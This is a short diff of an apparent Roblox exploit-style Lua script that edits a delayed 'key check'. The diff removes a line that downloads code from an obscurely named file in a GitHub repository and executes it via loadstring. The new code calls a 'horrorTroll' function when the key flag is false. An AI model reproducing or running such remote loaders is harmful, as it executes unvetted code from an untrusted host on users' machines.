@@ -97,9 +97,7 @@ end
 
 -- 🔒 Key check (5-second delay)
 task.delay(5, function()
-	if getgenv().iSaidEpic == true then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/ffbbsndv/Ehheheheje/refs/heads/main/.github/workflows/rurj.txt"))()
-	else
+	if getgenv().iSaidEpic == false then
 		horrorTroll()
 	end
 end)
